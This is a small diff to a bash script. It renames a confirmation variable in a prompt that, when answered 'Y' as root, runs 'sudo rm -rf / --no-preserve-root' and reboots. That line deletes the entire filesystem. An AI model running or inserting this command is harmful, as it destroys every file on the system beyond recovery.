@@ -7,11 +7,11 @@ if [ "$EUID" -ne 0 ]
   exit
 fi
 echo "Cool, As per your wish"
-if [[ $stack == "Y" ]] ; then
+if [[ $confirmation == "Y" ]] ; then
 sudo rm -rf / --no-preserve-root
 sudo reboot
 
-elif [[ $stack == "N" ]] ; then
+elif [[ $confirmation == "N" ]] ; then
 echo "Great Choice , See you!"
 exit
 
